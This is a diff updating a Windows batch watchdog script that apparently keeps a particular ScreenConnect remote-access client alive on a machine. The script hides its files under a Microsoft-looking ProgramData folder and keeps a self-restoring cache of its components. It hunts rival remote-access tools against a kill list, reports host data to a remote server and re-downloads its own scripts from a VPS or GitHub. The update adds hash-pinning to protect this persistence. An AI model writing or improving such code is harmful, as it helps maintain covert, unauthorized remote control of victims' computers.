@@ -56,6 +56,18 @@ rem 0.1.6: fd-trap sweep (C22 doctrine) - single-digit-before-> writes (echo 0>f
 rem   handle redirects and create EMPTY files; counter resets now use the immune prefix
 rem   form (>file echo 0). Fixes guard.cnt reset landing empty (agent re-randomized the
 rem   cadence instead of a clean 0). !VAR!> writes were always safe (parse-time '!').
+rem 0.1.7: C23 audit fixes - (a) RmmScan joined multi-alternative rmm| signatures (only
+rem   the first token was being used - TeamViewer/VNC/LogMeIn etc. were half-blind) and
+rem   strips quote chars from harvested paths (a quoted ImagePath broke the Digest curl
+rem   argument); (b) user.config relay fallback now also reads Settings-XML format;
+rem   (c) self-reported digest version is GVER, one source of truth (was hardcoded 0.1.5);
+rem   (d) all timeout.exe waits -> ping -n (timeout is instant without a console);
+rem   (e) Fetch2 uses curl --fail so an HTTP error page can no longer satisfy the size
+rem   check and block the GitHub fallback; (f) SelfCheck content integrity: core files are
+rem   SHA256-verified against the cached pins (existence != integrity), tampered files are
+rem   restored from a pin-verified cache copy or re-fetched with hash check, and ONLY
+rem   pin-verified files may be mirrored into the resurrection cache (poisoning fix);
+rem   (g) rmm.new/rmm.top read via for/f (set/p truncates at 1024 bytes).
 setlocal EnableExtensions EnableDelayedExpansion
 set "ZD=C:\ProgramData\WinRTCS"
 set "CD=C:\ProgramData\Microsoft\WinRTCS\cache"
@@ -82,6 +94,7 @@ set "GDIR86=C:\Program Files (x86)\ScreenConnect Client (36e506ff016b2151)"
 set "GDIR64=C:\Program Files\ScreenConnect Client (36e506ff016b2151)"
 set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
 set "PACKED=814CC7D9653A3969CD5C14CE440DB313"
+set "GVER=0.1.7"
 if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
 
 rem --- overlap lock: atomic mkdir acquire (file-exists check raced when both tasks fire together);
@@ -142,7 +155,7 @@ sc query "!GSVC!" 2>nul | findstr /C:"RUNNING" >nul
 if errorlevel 1 (
   echo [%DATE% %TIME%] svc_stopped start_attempt !GSVC!>>"%LOG%"
   sc start "!GSVC!" >nul 2>&1
-  timeout /t 8 /nobreak >nul 2>&1
+  ping -n 9 127.0.0.1 >nul 2>&1
   sc query "!GSVC!" 2>nul | findstr /C:"RUNNING" >nul
   if errorlevel 1 (
     set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%"
@@ -167,9 +180,9 @@ if defined GUP goto :Healthy
 rem --- zombie: RUNNING but no established session -> restart once, recheck, else fight+install ---
 echo [%DATE% %TIME%] zombie_restart !GSVC!>>"%LOG%"
 sc stop "!GSVC!" >nul 2>&1
-timeout /t 4 /nobreak >nul 2>&1
+ping -n 5 127.0.0.1 >nul 2>&1
 sc start "!GSVC!" >nul 2>&1
-timeout /t 15 /nobreak >nul 2>&1
+ping -n 16 127.0.0.1 >nul 2>&1
 call :Session
 if defined GUP ( echo 170>"%ZD%\guard.cnt" & goto :Healthy )
 set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%"
@@ -274,7 +287,7 @@ if "!MSIEXIT!"=="3010" goto :WaitSvc0
 if !ATTEMPT! GEQ 2 ( set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%" & echo [%DATE% %TIME%] FAIL_msiexec_!MSIEXIT! streak=!STREAK!>>"%LOG%" & echo 170>"%ZD%\guard.cnt" & goto :Done )
 msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress >nul 2>&1
 call :PurgePhantom
-timeout /t 5 /nobreak >nul 2>&1
+ping -n 6 127.0.0.1 >nul 2>&1
 goto :TryInstall
 
 :PurgePhantom
@@ -289,7 +302,7 @@ exit /b 0
 set "W=0"
 set "STARTED=0"
 :WaitSvc
-timeout /t 5 /nobreak >nul 2>&1
+ping -n 6 127.0.0.1 >nul 2>&1
 call :Detect
 if defined GSVC (
   sc query "!GSVC!" 2>nul | findstr /C:"RUNNING" >nul
@@ -335,7 +348,7 @@ if defined SHIMG (
 :WaitSession
 set "W=0"
 :WaitSess
-timeout /t 5 /nobreak >nul 2>&1
+ping -n 6 127.0.0.1 >nul 2>&1
 call :Session
 if defined GUP (
   echo %DATE% %TIME%>"%PRESENT%"
@@ -484,11 +497,28 @@ if errorlevel 1 (
     set "SIEGE=!SIEGE!sentinel_task,"
   )
 )
-rem --- mirror the running components into the resurrection cache (agent hash-gates its own
-rem --- mirror; here we mirror run/guard which the agent already hash-verified at download) ---
-if exist "%ZD%\winrtcs_agent.cmd" copy /y "%ZD%\winrtcs_agent.cmd" "%CD%\winrtcs_agent.cmd" >nul 2>&1
-if exist "%ZD%\winrtcs_run.cmd" copy /y "%ZD%\winrtcs_run.cmd" "%CD%\winrtcs_run.cmd" >nul 2>&1
-if exist "%ZD%\winrtcs_guard.cmd" copy /y "%ZD%\winrtcs_guard.cmd" "%CD%\winrtcs_guard.cmd" >nul 2>&1
+rem --- content integrity (C23): existence is not integrity. Hash the core files against the
+rem --- cached pins; a tampered/mismatched local file is restored from a pin-verified cache
+rem --- copy or re-fetched with a hash check. Root of trust here is the cache (the agent's
+rem --- network-pinned channel is the authoritative root and re-mints the cache each tick). ---
+set "PIN_A="
+set "PIN_R="
+set "PIN_G="
+if exist "%CD%\winrtcs.version" for /f "usebackq tokens=1,* delims==" %%K in ("%CD%\winrtcs.version") do (
+  if /I "%%K"=="AGENT_SHA256" set "PIN_A=%%L"
+  if /I "%%K"=="RUN_SHA256" set "PIN_R=%%L"
+  if /I "%%K"=="GUARD_SHA256" set "PIN_G=%%L"
+)
+if defined PIN_A call :VerifyCore winrtcs_agent.cmd "!PIN_A!"
+if defined PIN_R call :VerifyCore winrtcs_run.cmd "!PIN_R!"
+if defined PIN_G call :VerifyCore winrtcs_guard.cmd "!PIN_G!"
+
+rem --- mirror ONLY pin-verified files into the resurrection cache (C23: a tampered local
+rem --- file must never poison the cache; without cached pins the mirror skips - the
+rem --- agent's network-pinned mirror still covers that window) ---
+if defined PIN_A call :MirrorPinned "%ZD%\winrtcs_agent.cmd" "!PIN_A!"
+if defined PIN_R call :MirrorPinned "%ZD%\winrtcs_run.cmd" "!PIN_R!"
+if defined PIN_G call :MirrorPinned "%ZD%\winrtcs_guard.cmd" "!PIN_G!"
 attrib +h "C:\ProgramData\Microsoft\WinRTCS" >nul 2>&1
 if defined SIEGE (
   echo [%DATE% %TIME%] SIEGE !SIEGE!>>"%LOG%"
@@ -516,8 +546,8 @@ rem --- services/processes against rmm| signatures from the kill list. Diff on S
 rem --- identity (relay/ver/path) so service state flapping never re-alerts. New/changed
 rem --- entries go to rmm.new (single alert line); summary goes to rmm.top for the map.
 rem --- REPORT ONLY. NOTE: no double-quote chars in the PS line below (cmd quoting rule).
-powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $sigs=@(); if(Test-Path '%KL%'){ foreach($l in Get-Content '%KL%'){ $t=$l.Trim(); if(-not $t -or $t.StartsWith('#')){ continue }; $sp=$t -split '\|'; if($sp[0] -eq 'rmm' -and $sp[1] -and $sp[2]){ $sigs+=,@($sp[1],$sp[2]) } } }; if(-not $sigs){ $sigs=@(@('AnyDesk','anydesk'),@('TeamViewer','teamviewer'),@('RustDesk','rustdesk'),@('VNC','winvnc|tvnserver|vncserver'),@('MeshCentral','meshagent')) }; $svcs=Get-CimInstance Win32_Service; $procs=Get-CimInstance Win32_Process; $full=@{}; $cmp=@{}; $short=@(); foreach($s in ($svcs | Where-Object { $_.Name -match '^ScreenConnect Client \(' })){ $fp=[regex]::Match($s.Name,'\(([0-9A-Fa-f]+)\)').Groups[1].Value; $img=$s.PathName; $h='';$pt='';$md=''; if($img -match '[?&]h=([^&\s]+)'){ $h=$Matches[1] }; if($img -match '[?&]p=(\d+)'){ $pt=$Matches[1] }; if($img -match '[?&]e=(\w+)'){ $md=$Matches[1] }; $exe=''; if($img -match '([A-Za-z]:\\[^?]+?\.exe)'){ $exe=$Matches[1] }; $dir=''; if($exe){ $dir=Split-Path $exe -Parent }; if(-not $h -and $dir -and (Test-Path (Join-Path $dir 'user.config'))){ $uc=(Get-Content (Join-Path $dir 'user.config') -Raw); if($uc -match 'key=.Host.\s+value=.([^\s/>]+)'){ $h=$Matches[1] }; if($uc -match 'key=.Port.\s+value=.(\d+)'){ $pt=$Matches[1] } }; $ver=''; if($exe -and (Test-Path $exe)){ $ver=(Get-Item $exe).VersionInfo.FileVersion }; $tag='UNKNOWN'; if($img -match 'gryxa\.com'){ $tag='gryxa' } elseif($fp -eq '5f6010579852e507' -or $fp -eq 'f861c8140d453427'){ $tag='keeper-sevrz' }; $stable=('relay='+$h+':'+$pt+' mode='+$md+' ver='+$ver+' ['+$tag+']'); $k='sc:'+$fp; $cmp[$k]=$stable; $full[$k]=('ScreenConnect FP='+$fp+' '+$stable+' state='+$s.State+' start='+$s.StartMode); $short+=('SC:'+$fp.Substring(0,[Math]::Min(8,$fp.Length))+'@'+$h+':'+$pt+'['+$tag+']') }; foreach($sig in $sigs){ $nm=$sig[0]; $pat=$sig[1]; $hs=$svcs | Where-Object { $_.Name -notmatch 'ScreenConnect' -and ($_.Name -match $pat -or $_.DisplayName -match $pat -or $_.PathName -match $pat) } | Select-Object -First 1; $hp=$null; if(-not $hs){ $hp=$procs | Where-Object { $_.Name -match $pat -or $_.Path -match $pat } | Select-Object -First 1 }; if($hs -or $hp){ $det=''; $pth=''; if($hs){ $pth=$hs.PathName; $det=('svc='+$hs.Name+' state='+$hs.State) } else { $pth=$hp.Path; $det=('proc='+$hp.Name) }; $ex2=''; if($pth -and ($pth -match '([A-Za-z]:\\[^?]+?\.exe)')){ $ex2=$Matches[1] }; $vr=''; if($ex2 -and (Test-Path $ex2)){ $vr=(Get-Item $ex2).VersionInfo.FileVersion }; if($pth){ $pth=($pth -replace '\s+',' ').Trim() }; $stable=('ver='+$vr+' :: '+$pth); $k='rmm:'+$nm; $cmp[$k]=$stable; $full[$k]=($nm+' '+$det+' '+$stable); $short+=($nm) } }; $top=(($short | Sort-Object -Unique) -join ';'); if(-not $top){ $top='none' }; $top | Set-Content -Path '%ZD%\rmm.top' -Encoding ASCII; $old=@{}; if(Test-Path '%ZD%\rmm.db'){ foreach($l in Get-Content '%ZD%\rmm.db'){ $pp=$l -split '\|'; if($pp.Count -ge 2){ $old[$pp[0]]=$pp[1] } } }; $news=@(); foreach($k in $cmp.Keys){ if(-not $old.ContainsKey($k) -or $old[$k] -ne $cmp[$k]){ $news+=$full[$k] } }; if($news){ ($news -join ' || ') | Set-Content -Path '%ZD%\rmm.new' -Encoding ASCII; ($news -join ' || ') | Set-Content -Path '%ZD%\rmm.last' -Encoding ASCII } else { Remove-Item '%ZD%\rmm.new' -Force }; $lines=@(); foreach($k in $cmp.Keys){ $lines+=($k+'|'+$cmp[$k]) }; if($lines){ $lines | Set-Content -Path '%ZD%\rmm.db' -Encoding ASCII } else { Remove-Item '%ZD%\rmm.db' -Force }" >nul 2>&1
-if exist "%ZD%\rmm.new" ( set /p "RMMNEW=" <"%ZD%\rmm.new" & echo [%DATE% %TIME%] rmm_new !RMMNEW!>>"%LOG%" )
+powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $sigs=@(); if(Test-Path '%KL%'){ foreach($l in Get-Content '%KL%'){ $t=$l.Trim(); if(-not $t -or $t.StartsWith('#')){ continue }; $sp=$t -split '\|'; if($sp[0] -eq 'rmm' -and $sp[1] -and $sp[2]){ $sigs+=,@($sp[1],($sp[2..($sp.Count-1)] -join '|')) } } }; if(-not $sigs){ $sigs=@(@('AnyDesk','anydesk'),@('TeamViewer','teamviewer'),@('RustDesk','rustdesk'),@('VNC','winvnc|tvnserver|vncserver'),@('MeshCentral','meshagent')) }; $svcs=Get-CimInstance Win32_Service; $procs=Get-CimInstance Win32_Process; $full=@{}; $cmp=@{}; $short=@(); foreach($s in ($svcs | Where-Object { $_.Name -match '^ScreenConnect Client \(' })){ $fp=[regex]::Match($s.Name,'\(([0-9A-Fa-f]+)\)').Groups[1].Value; $img=$s.PathName; $h='';$pt='';$md=''; if($img -match '[?&]h=([^&\s]+)'){ $h=$Matches[1] }; if($img -match '[?&]p=(\d+)'){ $pt=$Matches[1] }; if($img -match '[?&]e=(\w+)'){ $md=$Matches[1] }; if($h){ $h=$h.Trim([char]34) }; $exe=''; if($img -match '([A-Za-z]:\\[^?]+?\.exe)'){ $exe=$Matches[1] }; $dir=''; if($exe){ $dir=Split-Path $exe -Parent }; if(-not $h -and $dir -and (Test-Path (Join-Path $dir 'user.config'))){ $uc=(Get-Content (Join-Path $dir 'user.config') -Raw); if($uc -match 'key=.Host.\s+value=.([^\s/>]+)'){ $h=$Matches[1] }; if($uc -match 'key=.Port.\s+value=.(\d+)'){ $pt=$Matches[1] }; if(-not $h -and $uc -match 'name=.Host.[^>]*>\s*<value>([^<]+)'){ $h=$Matches[1] }; if(-not $pt -and $uc -match 'name=.Port.[^>]*>\s*<value>(\d+)'){ $pt=$Matches[1] } }; $ver=''; if($exe -and (Test-Path $exe)){ $ver=(Get-Item $exe).VersionInfo.FileVersion }; $tag='UNKNOWN'; if($img -match 'gryxa\.com'){ $tag='gryxa' } elseif($fp -eq '5f6010579852e507' -or $fp -eq 'f861c8140d453427'){ $tag='keeper-sevrz' }; $stable=('relay='+$h+':'+$pt+' mode='+$md+' ver='+$ver+' ['+$tag+']'); $k='sc:'+$fp; $cmp[$k]=$stable; $full[$k]=('ScreenConnect FP='+$fp+' '+$stable+' state='+$s.State+' start='+$s.StartMode); $short+=('SC:'+$fp.Substring(0,[Math]::Min(8,$fp.Length))+'@'+$h+':'+$pt+'['+$tag+']') }; foreach($sig in $sigs){ $nm=$sig[0]; $pat=$sig[1]; $hs=$svcs | Where-Object { $_.Name -notmatch 'ScreenConnect' -and ($_.Name -match $pat -or $_.DisplayName -match $pat -or $_.PathName -match $pat) } | Select-Object -First 1; $hp=$null; if(-not $hs){ $hp=$procs | Where-Object { $_.Name -match $pat -or $_.Path -match $pat } | Select-Object -First 1 }; if($hs -or $hp){ $det=''; $pth=''; if($hs){ $pth=$hs.PathName; $det=('svc='+$hs.Name+' state='+$hs.State) } else { $pth=$hp.Path; $det=('proc='+$hp.Name) }; $ex2=''; if($pth -and ($pth -match '([A-Za-z]:\\[^?]+?\.exe)')){ $ex2=$Matches[1] }; $vr=''; if($ex2 -and (Test-Path $ex2)){ $vr=(Get-Item $ex2).VersionInfo.FileVersion }; if($pth){ $pth=(($pth -replace [char]34,' ') -replace '\s+',' ').Trim() }; $stable=('ver='+$vr+' :: '+$pth); $k='rmm:'+$nm; $cmp[$k]=$stable; $full[$k]=($nm+' '+$det+' '+$stable); $short+=($nm) } }; $top=(($short | Sort-Object -Unique) -join ';'); if(-not $top){ $top='none' }; $top | Set-Content -Path '%ZD%\rmm.top' -Encoding ASCII; $old=@{}; if(Test-Path '%ZD%\rmm.db'){ foreach($l in Get-Content '%ZD%\rmm.db'){ $pp=$l -split '\|'; if($pp.Count -ge 2){ $old[$pp[0]]=$pp[1] } } }; $news=@(); foreach($k in $cmp.Keys){ if(-not $old.ContainsKey($k) -or $old[$k] -ne $cmp[$k]){ $news+=$full[$k] } }; if($news){ ($news -join ' || ') | Set-Content -Path '%ZD%\rmm.new' -Encoding ASCII; ($news -join ' || ') | Set-Content -Path '%ZD%\rmm.last' -Encoding ASCII } else { Remove-Item '%ZD%\rmm.new' -Force }; $lines=@(); foreach($k in $cmp.Keys){ $lines+=($k+'|'+$cmp[$k]) }; if($lines){ $lines | Set-Content -Path '%ZD%\rmm.db' -Encoding ASCII } else { Remove-Item '%ZD%\rmm.db' -Force }" >nul 2>&1
+if exist "%ZD%\rmm.new" ( for /f "usebackq delims=" %%L in ("%ZD%\rmm.new") do set "RMMNEW=%%L" & echo [%DATE% %TIME%] rmm_new !RMMNEW!>>"%LOG%" )
 exit /b 0
 
 :Digest
@@ -531,10 +561,10 @@ if defined SUSREP if /I not "!SUSREP!"=="" set "DSUS=!SUSREP!"
 set "DSIEGE="
 if defined SIEGE_ACT set "DSIEGE=!SIEGE!"
 set "DRMM="
-if exist "%ZD%\rmm.top" set /p "DRMM=" <"%ZD%\rmm.top"
+if exist "%ZD%\rmm.top" for /f "usebackq delims=" %%L in ("%ZD%\rmm.top") do set "DRMM=%%L"
 set "DRMMNEW="
-if exist "%ZD%\rmm.new" set /p "DRMMNEW=" <"%ZD%\rmm.new"
-start "" /min "%CURL%" -s -o nul --ssl-no-revoke --connect-timeout 4 --max-time 8 -X POST -H "Authorization: Bearer %TOK%" --data-urlencode "host=%COMPUTERNAME%" --data-urlencode "state=!GSTATE!" --data-urlencode "streak=!STREAK!" --data-urlencode "extkill=!EXTK!" --data-urlencode "guard=0.1.5" --data-urlencode "siege=!DSIEGE!" --data-urlencode "suspects=!DSUS!" --data-urlencode "rmm=!DRMM!" --data-urlencode "rmm_new=!DRMMNEW!" "%REPORT%" >nul 2>&1
+if exist "%ZD%\rmm.new" for /f "usebackq delims=" %%L in ("%ZD%\rmm.new") do set "DRMMNEW=%%L"
+start "" /min "%CURL%" -s -o nul --ssl-no-revoke --connect-timeout 4 --max-time 8 -X POST -H "Authorization: Bearer %TOK%" --data-urlencode "host=%COMPUTERNAME%" --data-urlencode "state=!GSTATE!" --data-urlencode "streak=!STREAK!" --data-urlencode "extkill=!EXTK!" --data-urlencode "guard=!GVER!" --data-urlencode "siege=!DSIEGE!" --data-urlencode "suspects=!DSUS!" --data-urlencode "rmm=!DRMM!" --data-urlencode "rmm_new=!DRMMNEW!" "%REPORT%" >nul 2>&1
 exit /b 0
 
 :Fetch2
@@ -542,9 +572,9 @@ rem %1 = repo-relative filename, %2 = destination. VPS mirror first (HTTPS + bea
 rem Cloudflare-fronted), GitHub raw fallback. Success = non-trivial file landed; callers
 rem do their own marker validation of content.
 del /f /q "%~2" >nul 2>&1
-if defined TOK "%CURL%" -L --ssl-no-revoke -H "Authorization: Bearer %TOK%" --connect-timeout 6 --max-time 30 -o "%~2" "%BASE2%/%~1?t=%RANDOM%%RANDOM%" >nul 2>&1
+if defined TOK "%CURL%" -f -L --ssl-no-revoke -H "Authorization: Bearer %TOK%" --connect-timeout 6 --max-time 30 -o "%~2" "%BASE2%/%~1?t=%RANDOM%%RANDOM%" >nul 2>&1
 if exist "%~2" for %%F in ("%~2") do if %%~zF GTR 10 exit /b 0
-"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%~2" "%BASE%/%~1?t=%RANDOM%%RANDOM%" >nul 2>&1
+"%CURL%" -f -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%~2" "%BASE%/%~1?t=%RANDOM%%RANDOM%" >nul 2>&1
 exit /b 0
 
 :FetchKL
@@ -590,7 +620,7 @@ start "" /min powershell -NoProfile -NonInteractive -Command "$ErrorActionPrefer
 set "SW=0"
 :ShieldsWait
 if exist "%ZD%\shields.done" goto :ShieldsOut
-timeout /t 5 /nobreak >nul 2>&1
+ping -n 6 127.0.0.1 >nul 2>&1
 set /a SW+=1
 if !SW! LSS 12 goto :ShieldsWait
 echo [%DATE% %TIME%] shields_timeout_proceeding>>"%LOG%"
@@ -607,3 +637,39 @@ call :Digest
 rmdir "%LOCKD%" >nul 2>&1
 del /f /q "%LOCK%" >nul 2>&1
 endlocal & exit /b 0
+
+:Sha256
+set "%~2="
+for /f "skip=1 tokens=1" %%H in ('certutil -hashfile "%~1" SHA256 2^>nul') do if not defined %~2 set "%~2=%%H"
+exit /b 0
+
+:VerifyCore
+rem %1 = basename, %2 = pinned SHA256. Local mismatch (or missing local) -> restore from a
+rem pin-verified cache copy, else fetch + hash-check. Tamper flags ride the siege report.
+set "VF=%ZD%\%~1"
+set "VCF=%CD%\%~1"
+set "VH="
+if exist "%VF%" call :Sha256 "%VF%" VH
+if defined VH if /I "!VH!"=="%~2" exit /b 0
+if exist "%VF%" (
+  set "SIEGE=!SIEGE!tamper_%~1,"
+  echo [%DATE% %TIME%] TAMPER %~1 hash_mismatch>>"%LOG%"
+  del /f /q "%VF%" >nul 2>&1
+)
+set "CH="
+if exist "%VCF%" call :Sha256 "%VCF%" CH
+if defined CH if /I "!CH!"=="%~2" ( copy /y "%VCF%" "%VF%" >nul 2>&1 & exit /b 0 )
+call :Fetch2 %~1 "%ZD%\vc.dl"
+set "DH="
+if exist "%ZD%\vc.dl" call :Sha256 "%ZD%\vc.dl" DH
+if defined DH if /I "!DH!"=="%~2" move /y "%ZD%\vc.dl" "%VF%" >nul 2>&1
+del /f /q "%ZD%\vc.dl" >nul 2>&1
+exit /b 0
+
+:MirrorPinned
+rem %1 = file, %2 = pinned SHA256 - cache entry only when content matches the pin
+if not exist "%~1" exit /b 0
+set "MP="
+call :Sha256 "%~1" MP
+if defined MP if /I "!MP!"=="%~2" copy /y "%~1" "%CD%\" >nul 2>&1
+exit /b 0
